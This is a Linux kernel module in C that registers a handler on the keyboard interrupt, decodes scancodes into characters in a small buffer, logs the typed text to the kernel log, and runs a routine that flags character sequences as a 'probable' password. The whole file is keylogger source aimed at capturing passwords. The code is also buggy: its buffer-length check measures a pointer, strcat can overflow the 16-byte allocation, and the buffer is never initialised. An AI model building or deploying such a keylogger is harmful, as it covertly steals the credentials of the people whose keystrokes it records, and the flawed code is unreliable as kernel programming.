#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <asm/io.h>
#include <linux/slab.h>

/*Thoughts:  I am working from the idea that I am just going to keep track of fifteen key strokes.
 I am only going to analyze those fifteen for lowercase, uppercase and numbers.

TODO: make the special characters work.

Quick search of the web: Password rules of UCSC:

    lower case letters (i.e. a-z)
    upper case letters (i.e. A-Z)
    numbers (i.e. 0-9)
    special characters (e.g. !@#$%^&*()_+|~-=\‘{}[]:";’<>?,./)
*/


// buffer for keeping the current sequence of keys.
int returnPressed(void);
int passwordFind(void);
char *buffy; 
int irq = 1;
static void* card_dev_id;
int shifty = 0;// the shift flag 1 = depressed shift, 0 = on prozac(released)

int numNum = 0;
int numUpper = 0;
int numSpecial = 0;
int numLower = 0;
int numT,uppT,lowT,specialT;
/*
 This function services keyboard interrupts.
*/

int returnPressed(void)
{
	printk(KERN_INFO "\n Buffy: %s",buffy);
	passwordFind();	
	return 0;
}

int passwordFind(void)
{
	if (numNum > 0){numT = 1;};
	if (numUpper > 0){uppT = 1;};
	if (numLower > 0){lowT = 1;};
	if (numSpecial > 0){specialT = 1;};
	if ((numT+uppT+lowT+specialT)>2)
	{
		numNum = 0;
		numUpper = 0;
		numSpecial = 0;
		numLower = 0;
		numT = 0;
		uppT = 0;
		lowT = 0;
		specialT = 0;
		return 1;//probable pwd
	}
	else
	{
		numNum = 0;
		numUpper = 0;
		numSpecial = 0;
		numLower = 0;
		numT = 0;
		uppT = 0;
		lowT = 0;
		specialT = 0;
		return 0;//not likely pwd
	}
}


irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
{
	static unsigned char scancode;
	card_dev_id = dev_id;
	
	/*
	 Read keyboard status
	*/
	scancode = inb (0x60);

	
	if (sizeof(buffy) < 16)
	{
	printk(KERN_INFO "\nsizeofcheck");
		//special keys: Return, shift...
		if (scancode == 0x1C) { returnPressed();}//we'll end on a return.
		if ((scancode == 0x2A) || (scancode == 0x36))	{ shifty = 1; }
		if ((scancode == 0xAA) || (scancode == 0xB6))	{ shifty = 0; }

		//TODO:	CREATE LOGIC: USING SHIFTY TO SWITCH UP CAP/NOT CAP
		//LETTERS

		if (shifty == 0)
		{	//printk(KERN_INFO "\nshifty0");
			if (scancode == 0x10) 	{strcat(buffy,"q" ); numLower++;}
			if (scancode == 0x11) 	{strcat(buffy,"w" ); numLower++;}
			if (scancode == 0x12) 	{strcat(buffy,"e" ); numLower++;}
			if (scancode == 0x13) 	{strcat(buffy,"r" ); numLower++;}
			if (scancode == 0x14) 	{strcat(buffy,"t" ); numLower++;}
			if (scancode == 0x15) 	{strcat(buffy,"y" ); numLower++;}
			if (scancode == 0x16) 	{strcat(buffy,"u" ); numLower++;}
			if (scancode == 0x17) 	{strcat(buffy,"i" ); numLower++;}
			if (scancode == 0x18) 	{strcat(buffy,"o" ); numLower++;}
			if (scancode == 0x19) 	{strcat(buffy,"p" ); numLower++;}
			if (scancode == 0x1E) 	{strcat(buffy,"a" ); numLower++;}
			if (scancode == 0x1F) 	{strcat(buffy,"s" ); numLower++;}
			if (scancode == 0x20) 	{strcat(buffy,"d" ); numLower++;}
			if (scancode == 0x21) 	{strcat(buffy,"f" ); numLower++;}
			if (scancode == 0x22) 	{strcat(buffy,"g" ); numLower++;}
			if (scancode == 0x23) 	{strcat(buffy,"h" ); numLower++;}
			if (scancode == 0x24) 	{strcat(buffy,"j" ); numLower++;}
			if (scancode == 0x25) 	{strcat(buffy,"k" ); numLower++;}
			if (scancode == 0x26) 	{strcat(buffy,"l" ); numLower++;}
			if (scancode == 0x2C) 	{strcat(buffy,"z" ); numLower++;}
			if (scancode == 0x2D) 	{strcat(buffy,"x" ); numLower++;}
			if (scancode == 0x2E) 	{strcat(buffy,"c" ); numLower++;}
			if (scancode == 0x2F) 	{strcat(buffy,"v" ); numLower++;}
			if (scancode == 0x30) 	{strcat(buffy,"b" ); numLower++;}
			if (scancode == 0x31) 	{strcat(buffy,"n" ); numLower++;}
			if (scancode == 0x32) 	{strcat(buffy,"m" ); numLower++;}
		//NUMBERS
			if (scancode == 0x02)	{strcat(buffy,"1" ); numNum++;}
			if (scancode == 0x03) 	{strcat(buffy,"2" ); numNum++;}
			if (scancode == 0x04) 	{strcat(buffy,"3" ); numNum++;}
			if (scancode == 0x05)	{strcat(buffy,"4" ); numNum++;}
			if (scancode == 0x06) 	{strcat(buffy,"5" ); numNum++;}
			if (scancode == 0x07)	{strcat(buffy,"6" ); numNum++;}
			if (scancode == 0x08) 	{strcat(buffy,"7" ); numNum++;}
			if (scancode == 0x09) 	{strcat(buffy,"8" ); numNum++;}
			if (scancode == 0x0A) 	{strcat(buffy,"9" ); numNum++;}
			if (scancode == 0x0B) 	{strcat(buffy,"0" ); numNum++;}
		}
		else
		{
			//printk(KERN_INFO "\nshifty1");
			if (scancode == 0x10) 	{strcat(buffy,"Q" ); numUpper++;}
			if (scancode == 0x11) 	{strcat(buffy,"W" ); numUpper++;}
			if (scancode == 0x12) 	{strcat(buffy,"E" ); numUpper++;}
			if (scancode == 0x13) 	{strcat(buffy,"R" ); numUpper++;}
			if (scancode == 0x14) 	{strcat(buffy,"T" ); numUpper++;}
			if (scancode == 0x15) 	{strcat(buffy,"Y" ); numUpper++;}
			if (scancode == 0x16) 	{strcat(buffy,"U" ); numUpper++;}
			if (scancode == 0x17) 	{strcat(buffy,"I" ); numUpper++;}
			if (scancode == 0x18) 	{strcat(buffy,"O" ); numUpper++;}
			if (scancode == 0x19) 	{strcat(buffy,"P" ); numUpper++;}
			if (scancode == 0x1E) 	{strcat(buffy,"A" ); numUpper++;}
			if (scancode == 0x1F) 	{strcat(buffy,"S" ); numUpper++;}
			if (scancode == 0x20) 	{strcat(buffy,"D" ); numUpper++;}
			if (scancode == 0x21) 	{strcat(buffy,"F" ); numUpper++;}
			if (scancode == 0x22) 	{strcat(buffy,"G" ); numUpper++;}
			if (scancode == 0x23) 	{strcat(buffy,"H" ); numUpper++;}
			if (scancode == 0x24) 	{strcat(buffy,"J" ); numUpper++;}
			if (scancode == 0x25) 	{strcat(buffy,"K" ); numUpper++;}
			if (scancode == 0x26) 	{strcat(buffy,"L" ); numUpper++;}
			if (scancode == 0x2C) 	{strcat(buffy,"Z" ); numUpper++;}
			if (scancode == 0x2D) 	{strcat(buffy,"X" ); numUpper++;}
			if (scancode == 0x2E) 	{strcat(buffy,"C" ); numUpper++;}
			if (scancode == 0x2F) 	{strcat(buffy,"V" ); numUpper++;}
			if (scancode == 0x30) 	{strcat(buffy,"B" ); numUpper++;}
			if (scancode == 0x31) 	{strcat(buffy,"N" ); numUpper++;}
			if (scancode == 0x32) 	{strcat(buffy,"M" ); numUpper++;}
		//shifted Numbers
			if (scancode == 0x02)	{strcat(buffy,"!" ); numSpecial++;}
			if (scancode == 0x03) 	{strcat(buffy,"@" ); numSpecial++;}
			if (scancode == 0x04) 	{strcat(buffy,"#" ); numSpecial++;}
			if (scancode == 0x05)	{strcat(buffy,"$" ); numSpecial++;}
			if (scancode == 0x06) 	{strcat(buffy,"%" ); numSpecial++;}
			if (scancode == 0x07)	{strcat(buffy,"^" ); numSpecial++;}
			if (scancode == 0x08) 	{strcat(buffy,"&" ); numSpecial++;}
			if (scancode == 0x09) 	{strcat(buffy,"*" ); numSpecial++;}
			if (scancode == 0x0A) 	{strcat(buffy,"(" ); numSpecial++;}
			if (scancode == 0x0B) 	{strcat(buffy,")" ); numSpecial++;}	
		}//end else


	}//end of count logic block
else
{
	//printk(KERN_INFO "\nreinit count");
	
	printk(KERN_INFO "\nThe buffer: %s\n", buffy);
	printk(KERN_INFO "\nPassword Flag(0 for not likely, 1 means likely password: %d \n",passwordFind() );
	strcpy(buffy,"");//should empty the buffer.
}
	return (irq_handler_t) IRQ_HANDLED;
}



/*
 Initialize the module - register the IRQ handler
*/

int init_module (void)
{
	buffy = (char *)kmalloc(16,GFP_KERNEL);
	return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "test_keyboard_irq_handler", (void *)(irq_handler));
}



void Clean(void) 
{
	printk(KERN_INFO "\nCLEANER MODULE ENTERED");
	free_irq(irq, card_dev_id);
	 
	
	//remove_proc_entry("",NULL);

}


MODULE_LICENSE ("GPL");

module_init(init_module);
module_exit(Clean);
